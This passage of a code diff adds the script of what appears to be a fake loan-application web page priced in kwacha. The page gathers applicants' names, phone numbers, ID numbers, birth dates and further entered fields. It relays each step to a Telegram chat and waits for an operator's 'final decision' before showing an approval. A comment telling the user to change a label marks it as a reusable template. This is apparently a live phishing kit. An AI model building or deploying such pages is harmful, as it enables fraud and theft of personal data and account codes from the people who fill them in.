+      `▪️ *EDIT_P4_LABEL:* ${field}\n\n`+
+    // ↑ CHANGE "EDIT_P4_LABEL" TO MATCH YOUR LABEL ↑
+      `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *FINAL DECISION:*`;
+    try{
+      await syncId();const r=await tgSend(msg,curRef);if(!r.ok)throw new Error();
+      document.getElementById("p4_ref").textContent=curRef;
+      document.getElementById("pg4").classList.remove("active");
+      document.getElementById("p4_wait").classList.add("show");
+      poll(curRef,
+        ()=>{
+          document.getElementById("p4_wait").classList.remove("show");
+          document.getElementById("appr_box").innerHTML=
+            `<strong>Name:</strong> ${app.name}<br/>`+
+            `<strong>Phone:</strong> ${app.phone}<br/>`+
+            `<strong>Amount:</strong> ${fmtZMW(parseInt(app.amt))}<br/>`+
+            `<strong>Ref:</strong> ${curRef}`;
+          document.getElementById("approved").classList.add("show");
+        },
+        ()=>{
+          document.getElementById("p4_wait").classList.remove("show");
+          document.getElementById("p4_field").value="";
+          document.getElementById("p4_err").style.display="none";
+          setLoad("p4",false);goPage("pg3");
+        }
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p4",false);}
+  }
+
+  // ── RESET ────────────────────────────────────
+  function resetAll(){
+    clearInterval(pollTimer);clearInterval(countdown);
+    app={};curRef=null;lastId=0;selectedTerm=12;loanAmount=500;
+    document.getElementById("loan-slider").value=500;updateCalc();
+    document.querySelectorAll(".term-btn").forEach(b=>b.classList.remove("active"));
+    document.querySelectorAll(".term-btn")[1].classList.add("active");
+    ["p2_name","p2_phone","p2_id","p2_amt","p2_dob","p3_field","p4_field"].forEach(id=>document.getElementById(id).value="");
+    ["p2_err","p3_err","p4_err"].forEach(id=>document.getElementById(id).style.display="none");
+    hideScreens();
+    ["p2","p3","p4"].forEach(p=>setLoad(p,false));
+    goPage("pg1");
+  }
+</script>
+</body>
+</html>
